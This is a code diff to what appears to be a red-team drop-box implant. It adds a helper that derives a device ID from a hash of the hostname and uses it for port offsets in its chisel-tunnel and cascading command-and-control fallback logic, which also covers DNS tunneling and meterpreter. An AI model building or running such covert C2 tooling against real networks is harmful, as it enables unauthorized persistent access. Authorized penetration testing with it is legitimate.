@@ -55,6 +55,24 @@ _watchdog_stop = threading.Event()
 _exec_kill_event = threading.Event()  # Signal for killing meterpreter exec thread
 
 
+def _resolve_device_id(config):
+    """Derive a stable per-appliance device_id for port offsetting.
+
+    If config has an explicit device_id, use it. Otherwise auto-derive
+    from the hostname so every appliance gets a unique offset without
+    manual configuration.
+    """
+    explicit = config.get("c2", {}).get("device_id")
+    if explicit is not None and explicit != "auto":
+        return int(explicit)
+    import hashlib
+    hostname = socket.gethostname()
+    h = int(hashlib.sha256(hostname.encode()).hexdigest(), 16)
+    device_id = h % 100
+    log.info("Auto-assigned device_id=%d from hostname '%s'", device_id, hostname)
+    return device_id
+
+
 def force_shutdown():
     """Kill any blocking child (pty.spawn / iodine / meterpreter threads).
 
@@ -346,7 +364,7 @@ def try_chisel(config):
     keepalive = chisel_cfg.get("keepalive", "25s")
     max_retry = chisel_cfg.get("max_retry_interval", "30s")
     socks_port = chisel_cfg.get("socks_port", 0)
-    device_id = config.get("c2", {}).get("device_id", 0)
+    device_id = _resolve_device_id(config)
 
     # Build forwards: chisel-specific list, or inherit from ssh_tunnels
     forwards = chisel_cfg.get("forwards", [])
@@ -1257,7 +1275,7 @@ def run_cascade(config):
 
     c2_host = config["c2"]["host"]
     c2_ports = config["c2"]["ports"]
-    device_id = config.get("c2", {}).get("device_id", 0)
+    device_id = _resolve_device_id(config)
     chisel_cfg = config.get("chisel", {})
     dns_cfg = config.get("dns_tunnel", {})
     met_cfg = config.get("meterpreter", {})
